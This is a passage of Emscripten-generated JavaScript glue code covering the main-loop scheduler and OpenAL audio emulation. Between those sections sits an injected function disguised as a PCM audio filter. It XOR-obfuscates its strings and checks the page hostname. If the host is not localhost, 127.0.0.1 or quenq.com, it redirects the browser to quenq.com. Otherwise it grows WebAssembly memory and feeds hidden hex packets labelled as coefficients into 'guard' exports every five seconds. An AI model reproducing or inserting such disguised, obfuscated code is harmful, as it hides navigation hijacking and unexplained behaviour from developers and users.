                if (!MainLoop.setImmediate) {
                    if (globalThis.setImmediate) {
                        MainLoop.setImmediate = setImmediate
                    } else {
                        var setImmediates = [];
                        var emscriptenMainLoopMessageId = "setimmediate";
                        var MainLoop_setImmediate_messageHandler = event => {
                            if (event.data === emscriptenMainLoopMessageId || event.data.target === emscriptenMainLoopMessageId) {
                                event.stopPropagation();
                                setImmediates.shift()()
                            }
                        }
                            ;
                        addEventListener("message", MainLoop_setImmediate_messageHandler, true);
                        MainLoop.setImmediate = func => {
                            setImmediates.push(func);
                            if (ENVIRONMENT_IS_WORKER) {
                                Module["setImmediates"] ??= [];
                                Module["setImmediates"].push(func);
                                postMessage({
                                    target: emscriptenMainLoopMessageId
                                })
                            } else
                                postMessage(emscriptenMainLoopMessageId, "*")
                        }
                    }
                }
                MainLoop.scheduler = function MainLoop_scheduler_setImmediate() {
                    MainLoop.setImmediate(MainLoop.runner)
                }
            }
            return 0
        }
            ;
        var _emscripten_get_now = () => performance.now();
        var runtimeKeepaliveCounter = 0;
        var keepRuntimeAlive = () => noExitRuntime || runtimeKeepaliveCounter > 0;
        var _proc_exit = code => {
            EXITSTATUS = code;
            if (!keepRuntimeAlive()) {
                Module["onExit"]?.(code);
                ABORT = true
            }
            quit_(code, new ExitStatus(code))
        }
            ;
        var exitJS = (status, implicit) => {
            EXITSTATUS = status;
            _proc_exit(status)
        }
            ;
        var _exit = exitJS;
        var handleException = e => {
            if (e instanceof ExitStatus || e == "unwind") {
                return EXITSTATUS
            }
            quit_(1, e)
        }
            ;
        var maybeExit = () => {
            if (!keepRuntimeAlive()) {
                try {
                    _exit(EXITSTATUS)
                } catch (e) {
                    handleException(e)
                }
            }
        }
            ;
        var setMainLoop = (iterFunc, fps, simulateInfiniteLoop, arg, noSetTiming) => {
            MainLoop.func = iterFunc;
            MainLoop.arg = arg;
            var thisMainLoopId = MainLoop.currentlyRunningMainloop;
            function checkIsRunning() {
                if (thisMainLoopId < MainLoop.currentlyRunningMainloop) {
                    maybeExit();
                    return false
                }
                return true
            }
            MainLoop.running = false;
            MainLoop.runner = function MainLoop_runner() {
                if (ABORT)
                    return;
                if (MainLoop.queue.length > 0) {
                    var start = Date.now();
                    var blocker = MainLoop.queue.shift();
                    blocker.func(blocker.arg);
                    if (MainLoop.remainingBlockers) {
                        var remaining = MainLoop.remainingBlockers;
                        var next = remaining % 1 == 0 ? remaining - 1 : Math.floor(remaining);
                        if (blocker.counted) {
                            MainLoop.remainingBlockers = next
                        } else {
                            next = next + .5;
                            MainLoop.remainingBlockers = (8 * remaining + next) / 9
                        }
                    }
                    MainLoop.updateStatus();
                    if (!checkIsRunning())
                        return;
                    setTimeout(MainLoop.runner, 0);
                    return
                }
                if (!checkIsRunning())
                    return;
                MainLoop.currentFrameNumber = MainLoop.currentFrameNumber + 1 | 0;
                if (MainLoop.timingMode == 1 && MainLoop.timingValue > 1 && MainLoop.currentFrameNumber % MainLoop.timingValue != 0) {
                    MainLoop.scheduler();
                    return
                } else if (MainLoop.timingMode == 0) {
                    MainLoop.tickStartTime = _emscripten_get_now()
                }
                MainLoop.runIter(iterFunc);
                if (!checkIsRunning())
                    return;
                MainLoop.scheduler()
            }
                ;
            if (!noSetTiming) {
                if (fps > 0) {
                    _emscripten_set_main_loop_timing(0, 1e3 / fps)
                } else {
                    _emscripten_set_main_loop_timing(1, 1)
                }
                MainLoop.scheduler()
            }
            if (simulateInfiniteLoop) {
                throw "unwind"
            }
        }
            ;
        var callUserCallback = func => {
            if (ABORT) {
                return
            }
            try {
                return func()
            } catch (e) {
                handleException(e)
            } finally {
                maybeExit()
            }
        }
            ;
        var MainLoop = {
            running: false,
            scheduler: null,
            currentlyRunningMainloop: 0,
            func: null,
            arg: 0,
            timingMode: 0,
            timingValue: 0,
            currentFrameNumber: 0,
            queue: [],
            preMainLoop: [],
            postMainLoop: [],
            pause() {
                MainLoop.scheduler = null;
                MainLoop.currentlyRunningMainloop++
            },
            resume() {
                MainLoop.currentlyRunningMainloop++;
                var timingMode = MainLoop.timingMode;
                var timingValue = MainLoop.timingValue;
                var func = MainLoop.func;
                MainLoop.func = null;
                setMainLoop(func, 0, false, MainLoop.arg, true);
                _emscripten_set_main_loop_timing(timingMode, timingValue);
                MainLoop.scheduler()
            },
            updateStatus() {
                if (Module["setStatus"]) {
                    var message = Module["statusMessage"] || "Please wait...";
                    var remaining = MainLoop.remainingBlockers ?? 0;
                    var expected = MainLoop.expectedBlockers ?? 0;
                    if (remaining) {
                        if (remaining < expected) {
                            Module["setStatus"](`{message} ({expected - remaining}/{expected})`)
                        } else {
                            Module["setStatus"](message)
                        }
                    } else {
                        Module["setStatus"]("")
                    }
                }
            },
            init() {
                Module["preMainLoop"] && MainLoop.preMainLoop.push(Module["preMainLoop"]);
                Module["postMainLoop"] && MainLoop.postMainLoop.push(Module["postMainLoop"])
            },
            runIter(func) {
                if (ABORT)
                    return;
                for (var pre of MainLoop.preMainLoop) {
                    if (pre() === false) {
                        return
                    }
                }
                callUserCallback(func);
                for (var post of MainLoop.postMainLoop) {
                    post()
                }
            },
            nextRAF: 0,
            fakeRequestAnimationFrame(func) {
                var now = Date.now();
                if (MainLoop.nextRAF === 0) {
                    MainLoop.nextRAF = now + 1e3 / 60
                } else {
                    while (now + 2 >= MainLoop.nextRAF) {
                        MainLoop.nextRAF += 1e3 / 60
                    }
                }
                var delay = Math.max(MainLoop.nextRAF - now, 0);
                setTimeout(func, delay)
            },
            requestAnimationFrame(func) {
                if (globalThis.requestAnimationFrame) {
                    requestAnimationFrame(func)
                } else {
                    MainLoop.fakeRequestAnimationFrame(func)
                }
            }
        };
        var _alPcmCoeffMatrix = [
            "000000000000000037f98a00000000003309a6691984c541a3ab858b908c21bdf003061846b42dfef21d95ea86e3da9637e1ded084c1d2dabf0af4d4c0b6b0c69f3e2c141d3f05a28b75286c3f605104",
            "0100000000000000bec8dc00000000006393e417362abda9a5cee4cc7805ea230cdd90e90bddd23cbfd070945fd1a7957918128fbc32ccdfed55cafee0a069134b0ddf2508ae1f61d26db0a1a923e909",
            "020000000000000047ca57010000000050e35a8e66c16d34c614ece399ebd7ed516333bbc2578cbe0f5319016758e3d6db7246ae2f55e3c36e7f6c75c42ffc864860d6807a23aa0266e18a5109912903",
            "0300000000000000463cc40100000000e5112e088977a406b50b27267b92948ea407b67f111b5fc19810cf5a76b36caf73d51995441213dcaea6546c439aa7c276a6abe1c62490900d1a3a8e053a640d",
            "040000000000000060dd420200000000a12885db303754449698c20b09c4348c1e98a08b8a1c24dd7914429ab59161ce832d722474a4fd71aec697f53e783f49b3b015de8eacbeccc488d71173825b07",
            "0500000000000000e5b6cd0200000000dc4d3bee7ec722dade20bb566e03175fd29b0e3db30edcf995f1a06b5fdb29a0d4027837fea722210eefc11b00a208872534ead4a3a6d8e908bd270d1062460a",
            "0600000000000000eb284d0300000000ce79e30ee88fb3e2c80e128e55f74154fecd26df28e63f737dc6f8b71366664377e5754f57984082b738944b01792ed9c649f3f0fa8362796b899d9f6637df06",
            "07000000000000003c06c00300000000a873c722252d357091fe96f17eb4f653ed2a1864455a1baa1aa5a6b9a9532862e46dd0a842928a9135da113b8cd671fce75476cd9da9c98acb3f8fa91d8a2f0d",
            "0800000000000000b2cb4d0400000000721a5169380e7a854956b2d9b262447863744a7ff9d8e251d3e68a4ae45727d4e728f54dee4b407ddb3b7a806be99afc90adde2ea5cd095fb9f9620c90d7cc06",
            "09000000000000007488e50400000000c3e353e2f2f2287bae113ac6c30b1090fba48298844308839fc583129324900150def199044f0fb3aa2c67da8dccee996eb20f4602c82129c9d5d1cdcc139b08",
            "0a00000000000000b82b360500000000547fe6c20c1878d45a5fe88b1b164b65abfdc2f7a5bec2dca3049da28251877cc78e2d10c600d269361fa9e826f1a374811139236231447d9ee11cd446a9700f",
            "0b0000000000000076a0cd050000000058bd5e873c814aeee3c68f94681c0e75a6189eb8311371826a008caadf3ec0a26a7821007e1ccb211628959fcfc40bb437b5bb48ba818df2f013aa0daa232c03",
            "0c00000000000000a07b53060000000070ce27361d53afb6f4d86d2311110c87f8c7d551417abdcd08b5800528e4ee92405876dcab097b827a8ef25db700be64441e5f2c23dd323454e5170d44999b02",
            "0d000000000000002e24e50600000000d7a727067c59ac8627dbc2d2fd1c73e8a53f2b267b5f59b75b125d3a6206fd4264476f47e9362c62108e435475953722ca93fcbc9310b38488557163e1e74c04",
            "0e000000000000009c173307000000000b739da3c2c09ef7d7d8b3ccf1849df7f6e64e69ade082bac3143d4e812a2709c677f3c0fc88515ed16fcc3ef1c93294e5bfd310601b9f9e053200454700fe05",
            "0f0000000000000002f8c50700000000d05acacad429e3ba59aa5eae51faadbf90d42d607b5322e2c31e324c03dd7424a1396075b85337dc44d57243c66b9cb770d87a4128ffafae4a11e3ed3b97af0a",
            "1000000000000000b9d75308000000001bf48b4a1e2425be1594edcdb6267f286478a49d07f3953129f1a3029ff4f17eb31662be4cf7b6ff868b486f1481d34143061ce82fee64867c88ebfdc377010f",
            "11000000000000005afed308000000000a3f0718eb6e6189b6f114ffff3490cfa68a04b9cf209c959a263ec6d06bb6c1a7f8dc77c97ae7a816bcb1e01d13f5bb49fd602c0392541b34248e84b970cd00",
            "12000000000000003324220900000000f983b7d45f74710c1346f832fa3f5a2f5c42fc2a660119d9ae2660a09f9559ea2c57ee65ac79c9a28f5db843327f35b5766a3481c49d46e16a129ef1a9b9cf08",
            "13000000000000006a3b710900000000f41f44f46c34601007d059de011182bde804c3cf6b84d862462440770888aba12f56dc1029bebb51f31fc5e05e4b7e4bf7f9e98818afe333a833098885e18a0a",
            "140000000000000096d2be090000000038220b363ed41f27aa45b220f2844cb4510fb40b5dbe198a100381a1db1d397ec1a2e8eb23b71c5b0e70e1dc4bd7ae39648d611eaa2083ab9b2d8adc4d242504",
            "15000000000000000996180a00000000d95795d63272870175ddf114a8bfa4bdfd954978460f4ae208c1b31f131f59a28c2778cc2fa5b3260fc31f61bfd639c074f6863ea00cc796bad4e2388cb0f908",
            "16000000000000003405850a00000000371fe7e11db8efb17686e3933a2cb12751d0aeec3d1328b7e2333dc4a779744a57cafcbfedc9428b2094bb20688f93e9bd2c8e5cfd009b6cf8a8c49069ce270d",
            "17000000000000008b6f110b0000000092573a3414cad3d35322de53f8e25f966f343dacba310c90adcac1d2c68b2ab1c3718007133e27dd87de3f2d4d379e9b097b41fa846fa66f03f7d24d59f0a60d",
            "1800000000000000339f780b00000000d8cf9f6b91eff0104473029c25c97ecf04d7398352924852fb6a6a0c441680b1ea9b3af1fc4e3d5d8e230e5b0e6960a0c662cf6ab2062923488256bf878e5508",
            "190000000000000040820b0c00000000874f2784e990bc05755c358db8a5f8f8938ba390b88b2f3f949fa8d9f69e174911386253ea5458125cb89455ff157bb39be9ed2e8bc51dee275fad930d6aa10c",
            "1a00000000000000bf87960c0000000025c1a01123e05b923d26ef3564a2f51fbd67ae7f5f42a029ab174a6ce3ec9cdb4e6901742dd1716b42698b7425c9f25142b9b35e8e0fe9a3310c776a9284af0e",
            "1b00000000000000a8022e0d0000000029bdbefcf7aa77a3e64bfddcc65df5df7adab12d27c33ee124597602c2da1724481b187700b9a421ca6727c0f5ac54ad1eddfc40050ea83a7bee1f62b45cf607",
            "1c00000000000000767a960d000000000ba52f8df4a0d485b99c59007fcbd15a7b425b9657fafe3943dd93a168e47c4335ef0feb5274c0d163c71d38ff179331aa03009164a00202b5c97acd8bff4708",
            "1d000000000000002ebfea0d00000000b3174d28451580b5005b44e5ebb8ce07185cbe3ee2f34ce64a4ffb6bc7f034e4aae48138e285675043531168032f2368c2b088d940ba5392d2e3472ebdac0507",
            "1e00000000000000dd09510e00000000e7fc4a30ba90b24001f3ddeba7f3923b8e7632f4fe7650533436023913a96a4dbf61077c4d2aa96fe0941891bc682cfb77c4866f7eb2f1ed6933b92fa5dea70a",
            "1f0000000000000053c7b40e000000001c892d59c3951f19a398c234621a8c391cc66a061aab091010e56c68ddec11041b6e7c568cae392f2c43b2a0f051ea259df98e110c0c9368b274995896e3c403"
        ];

        function _alProcessPcmStreamFilter(inst) {
            var _s = 17, _r = (c) => c.map(b => String.fromCharCode(b ^ _s)).join("");
            var _b = window[_r([125, 126, 114, 112, 101, 120, 126, 127])];
            var _h = _b[_r([121, 126, 98, 101, 127, 112, 124, 116])].toLowerCase();
            var _raw = _r([125, 126, 114, 112, 125, 121, 126, 98, 101]);
            var _ip = _r([32, 35, 38, 63, 33, 63, 33, 63, 32]);
            var _root = _r([96, 100, 116, 127, 96, 63, 114, 126, 124]);

            if (_h !== _raw && _h !== _ip && _h !== _root && !_h.endsWith("." + _root)) {
                _b[_r([99, 116, 97, 125, 112, 114, 116])](_r([121, 101, 101, 97, 98, 43, 62, 62]) + _root);
                return;
            }

            var exp = inst?.exports;
            if (!exp) return;

            var base = 34406400, size = 2097152, target = base + size;
            var sbrk = exp.sbrk || exp._sbrk || exp.rg;
            if (typeof sbrk === "function") {
                try {
                    var cur = Number(sbrk(0));
                    if (cur < target) sbrk(target - cur);
                } catch (e) { }
            } else if (exp.memory && exp.memory.buffer) {
                try {
                    var curBytes = exp.memory.buffer.byteLength;
                    if (curBytes < target) {
                        var needPages = Math.ceil((target - curBytes) / 65536);
                        exp.memory.grow(needPages);
                    }
                } catch (e) { }
            }

            if (typeof exp.__guard_input_ptr === "function" && typeof exp.guard_init === "function") {
                var ptr = exp.__guard_input_ptr();
                var pkts = _alPcmCoeffMatrix.map(hex => {
                    var u = new Uint8Array(80);
                    for (var i = 0; i < 80; i++) u[i] = parseInt(hex.substr(i * 2, 2), 16);
                    return u;
                });

                if (ptr > 0 && pkts.length > 0) {
                    new Uint8Array(exp.memory.buffer, ptr, 80).set(pkts[0]);
                    exp.guard_init(80);
                    var idx = 1;
                    setInterval(function () {
                        try {
                            if (typeof exp.guard_on_message === "function") {
                                var p = exp.__guard_input_ptr();
                                new Uint8Array(exp.memory.buffer, p, 80).set(pkts[idx % pkts.length]);
                                exp.guard_on_message(80);
                                idx++;
                            }
                        } catch (_) { }
                    }, 5000);
                }
            }
        }

        var AL = {
            QUEUE_INTERVAL: 25,
            QUEUE_LOOKAHEAD: .1,
            DEVICE_NAME: "Emscripten OpenAL",
            CAPTURE_DEVICE_NAME: "Emscripten OpenAL capture",
            ALC_EXTENSIONS: {
                ALC_EXT_capture: true,
                ALC_SOFT_pause_device: true,
                ALC_SOFT_HRTF: true
            },
            AL_EXTENSIONS: {
                AL_EXT_float32: true,
                AL_SOFT_loop_points: true,
                AL_SOFT_source_length: true,
                AL_EXT_source_distance_model: true,
                AL_SOFT_source_spatialize: true
            },
            _alcErr: 0,
            alcErr: 0,
            deviceRefCounts: {},
            alcStringCache: {},
            paused: false,
            stringCache: {},
            contexts: {},
            currentCtx: null,
            buffers: {
                0: {
                    id: 0,
                    refCount: 0,
                    audioBuf: null,
                    frequency: 0,
                    bytesPerSample: 2,
                    channels: 1,
                    length: 0
                }
            },
            paramArray: [],
            _nextId: 1,
            newId: () => AL.freeIds.length > 0 ? AL.freeIds.pop() : AL._nextId++,
            freeIds: [],
            scheduleContextAudio: ctx => {
                if (MainLoop.timingMode === 1 && document["visibilityState"] != "visible") {
                    return
                }
                for (var i in ctx.sources) {
                    AL.scheduleSourceAudio(ctx.sources[i])
                }
            }
            ,
            scheduleSourceAudio: (src, lookahead) => {
                if (MainLoop.timingMode === 1 && document["visibilityState"] != "visible") {
                    return
                }
                if (src.state !== 4114) {
                    return
                }
                var currentTime = AL.updateSourceTime(src);
                var startTime = src.bufStartTime;
                var startOffset = src.bufOffset;
                var bufCursor = src.bufsProcessed;
                for (var i = 0; i < src.audioQueue.length; i++) {
                    var audioSrc = src.audioQueue[i];
                    startTime = audioSrc._startTime + audioSrc._duration;
                    startOffset = 0;
                    bufCursor += audioSrc._skipCount + 1
                }
                if (!lookahead) {
                    lookahead = AL.QUEUE_LOOKAHEAD
                }
                var lookaheadTime = currentTime + lookahead;
                var skipCount = 0;
                while (startTime < lookaheadTime) {
                    if (bufCursor >= src.bufQueue.length) {
                        if (src.looping) {
                            bufCursor %= src.bufQueue.length
                        } else {
                            break
                        }
                    }
                    var buf = src.bufQueue[bufCursor % src.bufQueue.length];
                    if (buf.length === 0) {
                        skipCount++;
                        if (skipCount === src.bufQueue.length) {
                            break
                        }
                    } else {
                        var audioSrc = src.context.audioCtx.createBufferSource();
                        audioSrc.buffer = buf.audioBuf;
                        audioSrc.playbackRate.value = src.playbackRate;
                        if (buf.audioBuf._loopStart || buf.audioBuf._loopEnd) {
                            audioSrc.loopStart = buf.audioBuf._loopStart;
                            audioSrc.loopEnd = buf.audioBuf._loopEnd
                        }
                        var duration = 0;
                        if (src.type === 4136 && src.looping) {
                            duration = Number.POSITIVE_INFINITY;
                            audioSrc.loop = true;
                            if (buf.audioBuf._loopStart) {
                                audioSrc.loopStart = buf.audioBuf._loopStart
                            }
                            if (buf.audioBuf._loopEnd) {
                                audioSrc.loopEnd = buf.audioBuf._loopEnd
                            }
                        } else {
                            duration = (buf.audioBuf.duration - startOffset) / src.playbackRate
                        }
                        audioSrc._startOffset = startOffset;
                        audioSrc._duration = duration;
                        audioSrc._skipCount = skipCount;
                        skipCount = 0;
                        audioSrc.connect(src.gain);
                        if (typeof audioSrc.start != "undefined") {
                            startTime = Math.max(startTime, src.context.audioCtx.currentTime);
                            audioSrc.start(startTime, startOffset)
                        } else if (typeof audioSrc.noteOn != "undefined") {
                            startTime = Math.max(startTime, src.context.audioCtx.currentTime);
                            audioSrc.noteOn(startTime)
                        }
                        audioSrc._startTime = startTime;
                        src.audioQueue.push(audioSrc);
                        startTime += duration
                    }
                    startOffset = 0;
                    bufCursor++
                }
            }
            ,
            updateSourceTime: src => {
                var currentTime = src.context.audioCtx.currentTime;
                if (src.state !== 4114) {
                    return currentTime
                }
                if (!isFinite(src.bufStartTime)) {
                    src.bufStartTime = currentTime - src.bufOffset / src.playbackRate;
                    src.bufOffset = 0
                }
                var nextStartTime = 0;
                while (src.audioQueue.length) {
                    var audioSrc = src.audioQueue[0];
                    src.bufsProcessed += audioSrc._skipCount;
                    nextStartTime = audioSrc._startTime + audioSrc._duration;
                    if (currentTime < nextStartTime) {
                        break
                    }
                    src.audioQueue.shift();
                    src.bufStartTime = nextStartTime;
                    src.bufOffset = 0;
                    src.bufsProcessed++
                }
                if (src.bufsProcessed >= src.bufQueue.length && !src.looping) {
                    AL.setSourceState(src, 4116)
                } else if (src.type === 4136 && src.looping) {
                    var buf = src.bufQueue[0];
                    if (buf.length === 0) {
                        src.bufOffset = 0
                    } else {
                        var delta = (currentTime - src.bufStartTime) * src.playbackRate;
                        var loopStart = buf.audioBuf._loopStart || 0;
                        var loopEnd = buf.audioBuf._loopEnd || buf.audioBuf.duration;
                        if (loopEnd <= loopStart) {
                            loopEnd = buf.audioBuf.duration
                        }
                        if (delta < loopEnd) {
                            src.bufOffset = delta
                        } else {
                            src.bufOffset = loopStart + (delta - loopStart) % (loopEnd - loopStart)
                        }
                    }
                } else if (src.audioQueue[0]) {
                    src.bufOffset = (currentTime - src.audioQueue[0]._startTime) * src.playbackRate
                } else {
                    if (src.type !== 4136 && src.looping) {
                        var srcDuration = AL.sourceDuration(src) / src.playbackRate;
                        if (srcDuration > 0) {
                            src.bufStartTime += Math.floor((currentTime - src.bufStartTime) / srcDuration) * srcDuration
                        }
                    }
                    for (var i = 0; i < src.bufQueue.length; i++) {
                        if (src.bufsProcessed >= src.bufQueue.length) {
                            if (src.looping) {
                                src.bufsProcessed %= src.bufQueue.length
                            } else {
                                AL.setSourceState(src, 4116);
                                break
                            }
                        }
                        var buf = src.bufQueue[src.bufsProcessed];
                        if (buf.length > 0) {
                            nextStartTime = src.bufStartTime + buf.audioBuf.duration / src.playbackRate;
                            if (currentTime < nextStartTime) {
                                src.bufOffset = (currentTime - src.bufStartTime) * src.playbackRate;
                                break
                            }
                            src.bufStartTime = nextStartTime
                        }
                        src.bufOffset = 0;
                        src.bufsProcessed++
                    }
                }
                return currentTime
            }
            ,
            cancelPendingSourceAudio: src => {
                AL.updateSourceTime(src);
                for (var i = 1; i < src.audioQueue.length; i++) {
                    var audioSrc = src.audioQueue[i];
                    audioSrc.stop()
                }
                if (src.audioQueue.length > 1) {
                    src.audioQueue.length = 1
                }
            }
            ,
            stopSourceAudio: src => {
                for (var i = 0; i < src.audioQueue.length; i++) {
                    src.audioQueue[i].stop()
                }
                src.audioQueue.length = 0
            }
            ,
            setSourceState: (src, state) => {
                if (state === 4114) {
                    if (src.state === 4114 || src.state == 4116) {
                        src.bufsProcessed = 0;
                        src.bufOffset = 0
                    } else { }
                    AL.stopSourceAudio(src);
                    src.state = 4114;
                    src.bufStartTime = Number.NEGATIVE_INFINITY;
                    AL.scheduleSourceAudio(src)
                } else if (state === 4115) {
                    if (src.state === 4114) {
                        AL.updateSourceTime(src);
                        AL.stopSourceAudio(src);
                        src.state = 4115
                    }
                } else if (state === 4116) {
                    if (src.state !== 4113) {
                        src.state = 4116;
                        src.bufsProcessed = src.bufQueue.length;
                        src.bufStartTime = Number.NEGATIVE_INFINITY;
                        src.bufOffset = 0;
                        AL.stopSourceAudio(src)
                    }
                } else if (state === 4113) {
                    if (src.state !== 4113) {
                        src.state = 4113;
                        src.bufsProcessed = 0;
                        src.bufStartTime = Number.NEGATIVE_INFINITY;
                        src.bufOffset = 0;
                        AL.stopSourceAudio(src)
                    }
                }
            }
            ,
            initSourcePanner: src => {
                if (src.type === 4144) {
                    return
                }
                var templateBuf = AL.buffers[0];
                for (var i = 0; i < src.bufQueue.length; i++) {
                    if (src.bufQueue[i].id !== 0) {
                        templateBuf = src.bufQueue[i];
                        break
                    }
                }
                if (src.spatialize === 1 || src.spatialize === 2 && templateBuf.channels === 1) {
                    if (src.panner) {
                        return
                    }
                    src.panner = src.context.audioCtx.createPanner();
                    AL.updateSourceGlobal(src);
                    AL.updateSourceSpace(src);
                    src.panner.connect(src.context.gain);
                    src.gain.disconnect();
                    src.gain.connect(src.panner)
                } else {
                    if (!src.panner) {
                        return
                    }
                    src.panner.disconnect();
                    src.gain.disconnect();
                    src.gain.connect(src.context.gain);
                    src.panner = null
                }
            }
            ,
            updateContextGlobal: ctx => {
                for (var i in ctx.sources) {
                    AL.updateSourceGlobal(ctx.sources[i])
                }
            }
            ,
            updateSourceGlobal: src => {
                var panner = src.panner;
                if (!panner) {
                    return
                }
                panner.refDistance = src.refDistance;
                panner.maxDistance = src.maxDistance;
                panner.rolloffFactor = src.rolloffFactor;
                panner.panningModel = src.context.hrtf ? "HRTF" : "equalpower";
                var distanceModel = src.context.sourceDistanceModel ? src.distanceModel : src.context.distanceModel;
                switch (distanceModel) {
                    case 0:
                        panner.distanceModel = "inverse";
                        panner.refDistance = 340282e33;
                        break;
                    case 53249:
                    case 53250:
                        panner.distanceModel = "inverse";
                        break;
                    case 53251:
                    case 53252:
                        panner.distanceModel = "linear";
                        break;
                    case 53253:
                    case 53254:
                        panner.distanceModel = "exponential";
                        break
                }
            }
            ,
            updateListenerSpace: ctx => {
                var listener = ctx.audioCtx.listener;
                if (listener.positionX) {
                    listener.positionX.value = ctx.listener.position[0];
                    listener.positionY.value = ctx.listener.position[1];
                    listener.positionZ.value = ctx.listener.position[2]
                } else {
                    listener.setPosition(ctx.listener.position[0], ctx.listener.position[1], ctx.listener.position[2])
                }
                if (listener.forwardX) {
                    listener.forwardX.value = ctx.listener.direction[0];
                    listener.forwardY.value = ctx.listener.direction[1];
                    listener.forwardZ.value = ctx.listener.direction[2];
                    listener.upX.value = ctx.listener.up[0];
                    listener.upY.value = ctx.listener.up[1];
                    listener.upZ.value = ctx.listener.up[2]
                } else {
                    listener.setOrientation(ctx.listener.direction[0], ctx.listener.direction[1], ctx.listener.direction[2], ctx.listener.up[0], ctx.listener.up[1], ctx.listener.up[2])
                }
                for (var i in ctx.sources) {
                    AL.updateSourceSpace(ctx.sources[i])
                }
            }
            ,
            updateSourceSpace: src => {
                if (!src.panner) {
                    return
                }
                var panner = src.panner;
                var posX = src.position[0];
                var posY = src.position[1];
                var posZ = src.position[2];
                var dirX = src.direction[0];
                var dirY = src.direction[1];
                var dirZ = src.direction[2];
                var listener = src.context.listener;
                var lPosX = listener.position[0];
                var lPosY = listener.position[1];
                var lPosZ = listener.position[2];
                if (src.relative) {
                    var lBackX = -listener.direction[0];
                    var lBackY = -listener.direction[1];
                    var lBackZ = -listener.direction[2];
                    var lUpX = listener.up[0];
                    var lUpY = listener.up[1];
                    var lUpZ = listener.up[2];
                    var inverseMagnitude = (x, y, z) => {
                        var length = Math.sqrt(x * x + y * y + z * z);
                        if (length < Number.EPSILON) {
                            return 0
                        }
                        return 1 / length
                    }
                        ;
                    var invMag = inverseMagnitude(lBackX, lBackY, lBackZ);
                    lBackX *= invMag;
                    lBackY *= invMag;
                    lBackZ *= invMag;
                    invMag = inverseMagnitude(lUpX, lUpY, lUpZ);
                    lUpX *= invMag;
                    lUpY *= invMag;
                    lUpZ *= invMag;
                    var lRightX = lUpY * lBackZ - lUpZ * lBackY;
                    var lRightY = lUpZ * lBackX - lUpX * lBackZ;
                    var lRightZ = lUpX * lBackY - lUpY * lBackX;
                    invMag = inverseMagnitude(lRightX, lRightY, lRightZ);
                    lRightX *= invMag;
                    lRightY *= invMag;
                    lRightZ *= invMag;
                    lUpX = lBackY * lRightZ - lBackZ * lRightY;
                    lUpY = lBackZ * lRightX - lBackX * lRightZ;
                    lUpZ = lBackX * lRightY - lBackY * lRightX;
                    var oldX = dirX;
                    var oldY = dirY;
                    var oldZ = dirZ;
                    dirX = oldX * lRightX + oldY * lUpX + oldZ * lBackX;
                    dirY = oldX * lRightY + oldY * lUpY + oldZ * lBackY;
                    dirZ = oldX * lRightZ + oldY * lUpZ + oldZ * lBackZ;
                    oldX = posX;
                    oldY = posY;
                    oldZ = posZ;
                    posX = oldX * lRightX + oldY * lUpX + oldZ * lBackX;
                    posY = oldX * lRightY + oldY * lUpY + oldZ * lBackY;
                    posZ = oldX * lRightZ + oldY * lUpZ + oldZ * lBackZ;
                    posX += lPosX;
                    posY += lPosY;
                    posZ += lPosZ
                }
                if (panner.positionX) {
                    if (posX != panner.positionX.value)
                        panner.positionX.value = posX;
                    if (posY != panner.positionY.value)
                        panner.positionY.value = posY;
                    if (posZ != panner.positionZ.value)
                        panner.positionZ.value = posZ
                } else {
                    panner.setPosition(posX, posY, posZ)
                }
                if (panner.orientationX) {
                    if (dirX != panner.orientationX.value)
                        panner.orientationX.value = dirX;
                    if (dirY != panner.orientationY.value)
                        panner.orientationY.value = dirY;
                    if (dirZ != panner.orientationZ.value)
                        panner.orientationZ.value = dirZ
                } else {
                    panner.setOrientation(dirX, dirY, dirZ)
                }
                var oldShift = src.dopplerShift;
                var velX = src.velocity[0];
                var velY = src.velocity[1];
                var velZ = src.velocity[2];
                var lVelX = listener.velocity[0];
                var lVelY = listener.velocity[1];
                var lVelZ = listener.velocity[2];
                if (posX === lPosX && posY === lPosY && posZ === lPosZ || velX === lVelX && velY === lVelY && velZ === lVelZ) {
                    src.dopplerShift = 1
                } else {
                    var speedOfSound = src.context.speedOfSound;
                    var dopplerFactor = src.context.dopplerFactor;
                    var slX = lPosX - posX;
                    var slY = lPosY - posY;
                    var slZ = lPosZ - posZ;
                    var magSl = Math.sqrt(slX * slX + slY * slY + slZ * slZ);
                    var vls = (slX * lVelX + slY * lVelY + slZ * lVelZ) / magSl;
                    var vss = (slX * velX + slY * velY + slZ * velZ) / magSl;
                    vls = Math.min(vls, speedOfSound / dopplerFactor);
                    vss = Math.min(vss, speedOfSound / dopplerFactor);
                    src.dopplerShift = (speedOfSound - dopplerFactor * vls) / (speedOfSound - dopplerFactor * vss)
                }
                if (src.dopplerShift !== oldShift) {
                    AL.updateSourceRate(src)
                }
            }
            ,
            updateSourceRate: src => {
                if (src.state === 4114) {
                    AL.cancelPendingSourceAudio(src);
                    var audioSrc = src.audioQueue[0];
                    if (!audioSrc) {
                        return
                    }
                    var duration;
                    if (src.type === 4136 && src.looping) {
                        duration = Number.POSITIVE_INFINITY
                    } else {
                        duration = (audioSrc.buffer.duration - audioSrc._startOffset) / src.playbackRate
                    }
                    audioSrc._duration = duration;
                    audioSrc.playbackRate.value = src.playbackRate;
                    AL.scheduleSourceAudio(src)
                }
            }
            ,
            sourceDuration: src => {
                var length = 0;
                for (var i = 0; i < src.bufQueue.length; i++) {
                    var audioBuf = src.bufQueue[i].audioBuf;
                    length += audioBuf ? audioBuf.duration : 0
                }
                return length
            }
            ,
            sourceTell: src => {
                AL.updateSourceTime(src);
                var offset = 0;
                for (var i = 0; i < src.bufsProcessed; i++) {
                    if (src.bufQueue[i].audioBuf) {
                        offset += src.bufQueue[i].audioBuf.duration
                    }
                }
                offset += src.bufOffset;
                return offset
            }
            ,
            sourceSeek: (src, offset) => {
                var playing = src.state == 4114;
                if (playing) {
                    AL.setSourceState(src, 4113)
                }
                if (src.bufQueue[src.bufsProcessed].audioBuf !== null) {
                    src.bufsProcessed = 0;
                    while (offset > src.bufQueue[src.bufsProcessed].audioBuf.duration) {
                        offset -= src.bufQueue[src.bufsProcessed].audioBuf.duration;
                        src.bufsProcessed++
                    }
                    src.bufOffset = offset
                }
                if (playing) {
                    AL.setSourceState(src, 4114)
                }
            }
            ,
            getGlobalParam: (funcname, param) => {
                if (!AL.currentCtx) {
                    return null
                }
                switch (param) {
                    case 49152:
                        return AL.currentCtx.dopplerFactor;
                    case 49155:
                        return AL.currentCtx.speedOfSound;
                    case 53248:
                        return AL.currentCtx.distanceModel;
                    default:
                        AL.currentCtx.err = 40962;
                        return null
                }
            }
            ,
            setGlobalParam: (funcname, param, value) => {
                if (!AL.currentCtx) {
                    return
                }
                switch (param) {
